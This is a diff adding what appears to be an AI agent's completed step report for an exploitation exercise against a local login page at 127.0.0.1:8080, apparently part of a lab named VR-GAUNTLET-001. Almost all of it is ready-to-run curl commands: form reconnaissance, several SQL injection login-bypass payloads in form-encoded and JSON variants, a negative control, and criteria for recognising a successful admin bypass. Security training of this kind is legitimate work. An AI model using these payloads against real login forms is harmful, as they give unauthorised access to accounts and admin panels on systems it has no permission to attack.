@@ -1,0 +1,63 @@
+STATUS: DONE — step exploit-login, target http://127.0.0.1:8080/login
+
+There is no spoon — it's just string concat. Here is the exact sequence to run:
+
+**0. RECON FORM:**
+```bash
+curl -s -i http://127.0.0.1:8080/login
+curl -s http://127.0.0.1:8080/login | grep -i -E "name=|form|username|password" -A2 -B2
+```
+
+**1. PAYLOAD — simplest admin bypass [SQLite/MySQL ` --`]:**
+```bash
+curl -s -i -L -c cookies.txt -b cookies.txt -X POST 'http://127.0.0.1:8080/login' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-urlencode "username=admin'-- -" \
+  --data-urlencode "password=x"
+```
+
+**2. PAYLOAD — `admin' OR '1'='1' --` — works when password checked in WHERE:**
+```bash
+curl -s -i -L -c cookies.txt -b cookies.txt -X POST 'http://127.0.0.1:8080/login' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-urlencode "username=admin' OR '1'='1'-- -" \
+  --data-urlencode "password=x"
+```
+
+**3. PAYLOAD — generic `' OR 1=1 --` :**
+```bash
+curl -s -i -L -X POST 'http://127.0.0.1:8080/login' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-urlencode "username=' OR 1=1-- -" \
+  --data-urlencode "password=' OR 1=1-- -"
+```
+
+**4. PAYLOAD — `admin' OR 1=1-- -` bypass without quotes on second side:**
+```bash
+curl -s -i -L -X POST 'http://127.0.0.1:8080/login' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-raw 'username=admin%27%20OR%201%3D1--%20-&password=foo'
+```
+
+**5. PAYLOAD — JSON API variant (if login expects JSON):**
+```bash
+curl -s -i -L -X POST 'http://127.0.0.1:8080/login' \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"admin'\''-- -","password":"x"}'
+
+curl -s -i -L -X POST 'http://127.0.0.1:8080/login' \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"admin'\'' OR '\''1'\''='\''1'\''-- -","password":"x"}'
+```
+
+**6. NEGATIVE CONTROL — should FAIL (proof):**
+```bash
+curl -s -i -X POST 'http://127.0.0.1:8080/login' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-urlencode "username=admin" \
+  --data-urlencode "password=wrongpassword"
+```
+
+Success = `302` to /dashboard, /admin, or `200` with `admin` token / `Set-Cookie: session=` + body containing admin panel vs failed login. Payload #1 `admin'-- -` is the primary admin bypass — the rest chain the same primitive.
+
+All targets are `http://127.0.0.1:8080` — inside VR-GAUNTLET-001.
